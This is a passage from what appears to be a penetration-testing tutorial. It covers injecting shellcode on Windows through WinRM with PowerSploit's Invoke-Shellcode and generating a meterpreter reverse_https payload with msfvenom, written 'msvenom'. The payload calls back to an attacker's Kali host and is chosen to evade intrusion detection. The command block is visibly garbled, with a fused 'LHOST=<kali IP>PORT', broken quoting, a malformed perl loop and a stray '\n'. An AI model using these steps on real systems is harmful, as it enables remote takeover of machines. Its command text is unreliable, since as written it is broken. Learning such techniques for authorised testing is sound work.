Python WinRM script with a PowerShell script called Invoke-Shellcode. Invoke-Shellcode is part of PowerSploit (https://github.com/PowerShellMafia/PowerSploit) by PowerShellMafia. This script will use Windows APIs to inject shellcode into the running process.

We don't want to run the script off of the Internet, so our first step is to download it on Kali Linux box. We can use wget in order to get the file: wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/shellcode.ps1. This will bring the file from github in raw form

to our system, allowing us to have the script itself without the HTML from the github display page.

Next, we need to generate some shellcode to execute. Inside Kali, we can use msvenom to generate the code to include in our script. Msvenom is a Metasploit script that will create shellcode for us, just have to pick the payload. For this example, we are going to use the windows/x64/meterpreter/reverse_https payload so that staged shellcode won't be easily viewed by host or network intrusion detection software. This payload requires two options: the callback host and the callback port.

```
msvenom -f c -p windows/x64/meterpreter/reverse_https \
LHOST=<kali IP>PORT=8675 EXITFUNC=thread | tr -d """" |\nperl -e 'while(><>) { $_ =~ s/\\x/\\x/g; print $_ }' \
sed 's/'\''//g' | sed 's/$//'
```

We are calling msvenom with C formatting by specifying the f c option. This isn't the output we are using, but it's easy enough to convert. We specify our payload with the -p option, and then specify our listening host (LHOST) and our listening port (LPORT). Remember to substitute your Kali instance's IP address for the LHOST value. Finally, we tell msvenom to create a payload that is threaded so don't have our process die when it's finished. The output from this will be a big block of code surrounded in quotation marks. We don't want those, so we pipe into the tr command to delete the double quotes from the output.
